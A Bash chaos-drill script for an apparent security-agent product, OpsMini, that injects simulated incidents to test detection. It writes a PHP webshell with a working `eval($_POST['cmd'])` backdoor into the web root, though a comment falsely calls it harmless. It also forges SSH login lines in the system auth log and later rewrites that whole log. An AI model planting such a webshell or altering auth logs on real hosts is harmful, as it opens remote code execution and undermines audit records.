#!/usr/bin/env bash
# OpsMini v1.3.0 自主 Agent 演练脚本（在目标主机上执行）
#
# 依次注入四类故障，然后用 API 校验感知层是否产出对应信号与事件：
#   1. 日志暴涨     -> family=log_growth
#   2. WebShell 落地 -> family=webshell
#   3. SSH 爆破成功   -> family=auth.anomaly（critical）
#   4. Web 用户派生 shell -> family=proc.anomaly
#
# 用法：
#   ./chaos-drill.sh                          # 默认 http://127.0.0.1:8888
#   BASE=http://127.0.0.1:8888 USER=opsmini PASS=xxx ./chaos-drill.sh
#   AUTO=1 ./chaos-drill.sh                    # 把 webshell 策略切成 auto，验证真实处置
#
# 说明：脚本只写 /var/log 下的演练文件与一个演练用 webshell，结束时自动清理
#      （若 Agent 已把 webshell 隔离，清理会跳过并提示还原方法）。

set -uo pipefail

BASE="${BASE:-http://127.0.0.1:8888}"
USER_NAME="${USER_NAME:-opsmini}"
PASS="${PASS:-}"
AUTO="${AUTO:-0}"
WAIT="${WAIT:-70}"
DATADIR="${DATADIR:-/data/opsmini/data}"
DRILL_TAG="opsmini-drill-$(date +%s)"
DRILL_IP="${DRILL_IP:-203.0.113.77}"
LOG_FILE="/var/log/${DRILL_TAG}.log"
WEB_ROOT=""
SHELL_FILE=""

say() { printf '%s\n' "$*"; }
ok()   { printf '  \033[32mPASS\033[0m %s\n' "$*"; }
bad()  { printf '  \033[31mFAIL\033[0m %s\n' "$*"; }
info() { printf '  ---- %s\n' "$*"; }

if [ -z "$PASS" ]; then
  if [ -r /data/opsmini/.init_passwd ]; then
    PASS="$(cat /data/opsmini/.init_passwd)"
  else
    say "需要密码：PASS=xxx 或确保 /data/opsmini/.init_passwd 可读"
    exit 2
  fi
fi

command -v curl >/dev/null || { say "需要 curl"; exit 2; }
command -v python3 >/dev/null || { say "需要 python3 解析 JSON"; exit 2; }

say "== OpsMini 自主 Agent 演练 =="
say "   目标: $BASE   演练标记: $DRILL_TAG"

TOKEN="$(curl -s -m 10 -X POST "$BASE/api/v1/auth/login" \
  -H 'Content-Type: application/json' \
  -d "$(python3 -c 'import json,sys;print(json.dumps({"username":sys.argv[1],"password":sys.argv[2]}))' "$USER_NAME" "$PASS")" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["data"]["access_token"])' 2>/dev/null)"

if [ -z "$TOKEN" ]; then
  say "登录失败，请检查用户名/密码"; exit 2
fi
AUTH="Authorization: Bearer $TOKEN"

api() { curl -s -m 10 -H "$AUTH" "$BASE$1"; }

# 演练前基线
BEFORE_SIG="$(api '/api/v1/sentinel/signals?limit=500' | python3 -c 'import sys,json;print(len(json.load(sys.stdin).get("data") or []))')"
BEFORE_INC="$(api '/api/v1/sentinel/incidents?limit=500' | python3 -c 'import sys,json;print(len(json.load(sys.stdin).get("data") or []))')"
info "基线：信号 ${BEFORE_SIG} 条 / 事件 ${BEFORE_INC} 个"

# 感知层是否在跑
api '/api/v1/sentinel/stats' | python3 -c '
import sys,json
d=json.load(sys.stdin).get("data") or {}
p=d.get("perception") or {}
print("  ---- 采集器:", ", ".join(p.get("collectors") or []), "| 学习期:", p.get("learning"), "| 急停:", d.get("paused"))
' || true

# 若要求验证真实处置，把 webshell 策略切到 auto
if [ "$AUTO" = "1" ]; then
  PID="$(api '/api/v1/sentinel/policies' | python3 -c '
import sys,json
for p in json.load(sys.stdin).get("data") or []:
    if p["family"]=="webshell": print(p["id"])
')"
  if [ -n "$PID" ]; then
    curl -s -m 10 -X PUT "$BASE/api/v1/sentinel/policies/$PID" -H "$AUTH" \
      -H 'Content-Type: application/json' -d '{"mode":"auto","enabled":true}' >/dev/null
    info "webshell 策略已切到 auto（演练后可改回 assist）"
  fi
fi

# ---------- 1. 日志暴涨 ----------
say "[1/4] 注入日志暴涨：$LOG_FILE"
: > "$LOG_FILE"
# 每轮 12MB，连续 4 轮，确保跨越 20MB/min 的硬阈值
for i in 1 2 3 4; do
  dd if=/dev/zero bs=1M count=12 2>/dev/null | tr '\0' 'x' | fold -w 120 >> "$LOG_FILE"
  echo "$(date -Is) ERROR drill synthetic line $i" >> "$LOG_FILE"
  sleep 3
done
info "已写入 $(du -h "$LOG_FILE" | cut -f1)"

# ---------- 2. WebShell ----------
for d in /var/www/html /var/www /www/wwwroot /data/www; do
  if [ -d "$d" ]; then WEB_ROOT="$d"; break; fi
done
if [ -z "$WEB_ROOT" ]; then
  WEB_ROOT="/var/www/html"; mkdir -p "$WEB_ROOT"
fi
SHELL_FILE="$WEB_ROOT/${DRILL_TAG}.php"
cat > "$SHELL_FILE" <<'PHP'
<?php
// OpsMini drill file: looks like a webshell on purpose, harmless by design.
if (isset($_POST['cmd'])) { eval($_POST['cmd']); }
PHP
info "已落地演练脚本：$SHELL_FILE"

# ---------- 3. SSH 爆破成功 ----------
AUTHLOG=""
for f in /var/log/auth.log /var/log/secure; do [ -f "$f" ] && AUTHLOG="$f" && break; done
if [ -n "$AUTHLOG" ]; then
  say "[3/4] 注入 SSH 失败 5 次 + 成功 1 次 -> $AUTHLOG"
  for i in 1 2 3 4 5; do
    echo "$(date '+%b %d %H:%M:%S') $(hostname) sshd[$$]: Failed password for invalid user drill from $DRILL_IP port $((40000+i)) ssh2" >> "$AUTHLOG"
  done
  echo "$(date '+%b %d %H:%M:%S') $(hostname) sshd[$$]: Accepted password for drill from $DRILL_IP port 40100 ssh2" >> "$AUTHLOG"
else
  say "[3/4] 跳过：找不到 auth.log / secure"
fi

# ---------- 4. Web 用户派生 shell ----------
say "[4/4] 以 www-data 身份派生 shell（进程链检测）"
if command -v setpriv >/dev/null; then
  setpriv --reuid=www-data --regid=www-data --clear-groups sh -c 'sleep 25' >/dev/null 2>&1 &
elif command -v runuser >/dev/null; then
  runuser -u www-data -- sh -c 'sleep 25' >/dev/null 2>&1 &
fi

say "等待采集与聚合（${WAIT}s）…"
sleep "$WAIT"

# ---------- 校验 ----------
say "== 校验结果 =="
RESULT="$(api '/api/v1/sentinel/signals?limit=500' | python3 -c '
import sys,json
rows=json.load(sys.stdin).get("data") or []
want={"log_growth":False,"webshell":False,"auth.anomaly":False,"proc.anomaly":False}
for r in rows:
    fam=r.get("family")
    if fam in want: want[fam]=True
print(json.dumps(want))
')"
echo "$RESULT" | python3 -c '
import sys,json
d=json.load(sys.stdin)
for k,v in d.items():
    print(("  \033[32mPASS\033[0m " if v else "  \033[31mFAIL\033[0m ")+k)
'
FAILED="$(echo "$RESULT" | python3 -c 'import sys,json;print(sum(1 for v in json.load(sys.stdin).values() if not v))')"

say "== 事件（最新 5 个）=="
api '/api/v1/sentinel/incidents?limit=5' | python3 -c '
import sys,json
for i in json.load(sys.stdin).get("data") or []:
    print("  [%s] %-28s %-9s %-12s %s" % (i.get("status"), (i.get("title") or "")[:28], i.get("severity"), i.get("mode") or "-", (i.get("summary") or "")[:60].replace("\n"," ")))
'

say "== 动作审计（最新 5 条）=="
api '/api/v1/sentinel/actions?limit=5' | python3 -c '
import sys,json
rows=json.load(sys.stdin).get("data") or []
if not rows: print("  （无：说明当前是 shadow/assist，未执行写动作）")
for a in rows:
    print("  %-6s %-22s %-8s %s" % (a.get("verdict"), a.get("tool"), a.get("risk"), (a.get("result") or "")[:50].replace("\n"," ")))
'

say "== 隔离区 =="
api '/api/v1/sentinel/quarantine' | python3 -c '
import sys,json
rows=json.load(sys.stdin).get("data") or []
if not rows: print("  （无）")
for q in rows[:5]:
    print("  #%s %s (%s)" % (q.get("id"), q.get("original_path"), q.get("reason")))
'

# ---------- 清理 ----------
say "== 清理演练痕迹 =="
rm -f "$LOG_FILE" && info "已删除 $LOG_FILE"
if [ -n "$SHELL_FILE" ] && [ -f "$SHELL_FILE" ]; then
  rm -f "$SHELL_FILE" && info "已删除演练 webshell $SHELL_FILE"
elif [ -n "$SHELL_FILE" ]; then
  info "演练 webshell 已被 Agent 隔离，可在「事件中心 → 隔离与封禁」一键还原后手动删除"
fi
if [ -n "$AUTHLOG" ]; then
  # 只在最后 10 行内清理演练注入的合成行，避免动到真实日志
  python3 - "$AUTHLOG" "$DRILL_IP" <<'PY'
import sys
p, ip = sys.argv[1], sys.argv[2]
lines=open(p,encoding='utf-8',errors='ignore').read().split('\n')
kept=[l for l in lines if ip not in l]
if len(kept)!=len(lines):
    open(p,'w',encoding='utf-8').write('\n'.join(kept))
    print("  已清理 %d 条演练登录记录" % (len(lines)-len(kept)))
PY
fi

if [ "$AUTO" = "1" ] && [ -n "${PID:-}" ]; then
  curl -s -m 10 -X PUT "$BASE/api/v1/sentinel/policies/$PID" -H "$AUTH" \
    -H 'Content-Type: application/json' -d '{"mode":"assist","enabled":true}' >/dev/null
  info "webshell 策略已恢复为 assist"
fi

say ""
if [ "$FAILED" = "0" ]; then
  say "演练结论：全部通过（4/4）"
  exit 0
else
  say "演练结论：有 ${FAILED} 项未通过，请查看上方信号与事件"
  exit 1
fi
